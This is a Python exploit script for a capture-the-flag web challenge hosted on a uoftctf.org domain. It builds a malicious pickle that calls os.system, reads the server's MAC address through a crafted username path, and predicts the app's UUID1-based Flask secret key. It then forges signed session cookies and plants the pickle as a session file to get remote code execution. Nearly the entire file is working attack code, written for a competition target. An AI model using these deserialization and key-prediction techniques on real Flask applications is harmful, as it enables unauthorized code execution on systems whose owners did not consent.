import os
import struct
import pickle
import random
from datetime import datetime, timedelta, timezone
import numpy as np
import requests
from tqdm import tqdm
from uuid import UUID

from sign import FlaskSigner

BASE_URL = "https://timeless-40799e980f28ed0c.chal.uoftctf.org/"

class RCE:
    def __reduce__(self):
        cmd = '/readflag > /app/app/static/flag.txt'
        return os.system, (cmd,)

def generate_pickle(filename='rce.pkl'):
    pickled_data = struct.pack("I", 0) + pickle.dumps(RCE())
    with open(filename, 'wb') as f:
        f.write(pickled_data)
        
def register_user(username,session):
    url = f"{BASE_URL}/register"
    password = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10))
    data = {
        "username": username,
        "password": password
    }
    session.post(url, data=data)
    return username, password

def login_user(session, username, password):
    url = f"{BASE_URL}/login"
    data = {
        "username": username,
        "password": password
    }
    session.post(url, data=data)
    
def gen_next_ts(server_start_time_ns, ts_range_microseconds=300, step_nanoseconds=100):
    ts_range = np.timedelta64(ts_range_microseconds, 'us') # server usually seems to have the UUID generated within 300 microseconds
    step = np.timedelta64(step_nanoseconds, 'ns')

    current_time = server_start_time_ns
    end_time = server_start_time_ns + ts_range

    while current_time <= end_time:
        yield int(current_time.astype('int64'))
        current_time += step
    
def get_server_start_time_as_datetime_and_epoch():
    response = requests.get(f"{BASE_URL}/status")
    data = response.json()
    server_time_str = data['server_time']
    server_time = datetime.strptime(server_time_str, "%Y-%m-%d %H:%M:%S.%f")
    uptime_str = data['uptime']
    hours, minutes, seconds = uptime_str.split(':')
    uptime = timedelta(
        hours=int(hours),
        minutes=int(minutes),
        seconds=float(seconds)
    )
    server_start_time = server_time - uptime
    epoch = datetime(1970, 1, 1)
    server_start_epoch = (server_start_time - epoch).total_seconds()
    return np.datetime64(server_start_time, 'ns'), int(server_start_epoch)

def calculate_clock_seq(seed):
    random.seed(seed)
    retval = random.getrandbits(14)
    # reset the random seed
    random.seed()
    return retval

def make_uuid1(node, clock_seq, nanoseconds):
    # 0x01b21dd213814000 is the number of 100-ns intervals between the
    # UUID epoch 1582-10-15 00:00:00 and the Unix epoch 1970-01-01 00:00:00.
    timestamp = nanoseconds // 100 + 0x01b21dd213814000
    time_low = timestamp & 0xffffffff
    time_mid = (timestamp >> 32) & 0xffff
    time_hi_version = (timestamp >> 48) & 0x0fff
    clock_seq_low = clock_seq & 0xff
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3f
    return UUID(fields=(time_low, time_mid, time_hi_version,
                        clock_seq_hi_variant, clock_seq_low, node), version=1)

def getnode():
    s = requests.Session()
    path = "/sys/class/net/eth0/address"
    username, password = register_user(path, s)
    login_user(s, username, password)
    upload_payload(s) # we just upload here to change the user.profile_photo from None to ''
    response = s.get(f"{BASE_URL}/profile_picture?username={path}",stream=True)
    # not sure why the server returns a content length of 4096... need to use this hack
    for chunk in response.iter_content(chunk_size=18):
        return int(chunk.decode().replace(":", ""), 16)

def crack_secret_key(session_cookie, server_start_ns, clock_seq):
    # this would work locally, but doesn't work with kubernetes mac address assignment
    # start_node = int("0242ac110002", 16)
    # end_node = int("0242ac11ffff", 16)
    
    # for node in range(start_node, end_node + 1):
        # for ts in gen_next_ts(server_start_ns):
        #     uuid = make_uuid1(node, clock_seq, ts)
        #     secret = str(uuid)
        #     signer = FlaskSigner(secret)
        #     try:
        #         signer.unsign(session_cookie)
        #         return secret
        #     except:
        #         continue
    node = getnode()
    for ts in gen_next_ts(server_start_ns):
        uuid = make_uuid1(node, clock_seq, ts)
        secret = str(uuid)
        signer = FlaskSigner(secret)
        try:
            signer.unsign(session_cookie)
            return secret
        except:
            continue
            
    print("Failed to crack the secret key.")
    exit(1)

def sign_cookie(secret, data):
    signer = FlaskSigner(secret)
    return signer.sign(data)

def upload_payload(session, pickle_file='rce.pkl'):
    url = f"{BASE_URL}/profile"
    with open(pickle_file, 'rb') as f:
        files = {"profile_photo": ("session:", f)}
        session.post(url, files=files)
    return int(datetime.now().timestamp())

def execute_rce(session, secret, timestamp, username):
    for ts in range(timestamp - 50, timestamp + 50):
        data = f"_{username}_{ts}"
        signed_data = sign_cookie(secret, data)
        session.cookies.set("session", signed_data)
        
        # Trigger the RCE
        session.get(BASE_URL)

        # clear cookie
        
        session.cookies.clear()
        
        # Attempt to retrieve the flag
        response = session.get(f"{BASE_URL}/static/flag.txt")
        if response.status_code == 200:
            return response.text
    print("Failed to retrieve the flag.")
    exit(1)
        

def main():
    session = requests.Session()
    
    # Step 1: Generate and save the malicious pickle
    generate_pickle()
    
    # Step 2: Derive UUID1 parameters
    
    server_start_time_ns, start_epoch = get_server_start_time_as_datetime_and_epoch()
    print(f"Server start time (ns): {server_start_time_ns}")
    print(f"Server start epoch: {start_epoch}")
    clock_seq = calculate_clock_seq(start_epoch)
    print(f"Clock sequence: {clock_seq}")
    
    # Step 3: Register and log in a new user
    username, password = register_user("/app/flask_session", session)
    login_user(session, username, password)
    
    # Step 4: Retrieve the session cookie
    session_cookie = session.cookies.get("session")
    
    # Step 5: Crack the Flask secret key
    secret = crack_secret_key(session_cookie, server_start_time_ns, clock_seq)
    if not secret:
        print("Failed to crack the secret key.")
        return
    print(f"Cracked secret key: {secret}")
    
    # Step 6: Upload the payload
    timestamp = upload_payload(session)
    
    # Step 7: Execute the RCE to retrieve the flag
    print(execute_rce(session, secret, timestamp, username))

if __name__ == "__main__":
    main()
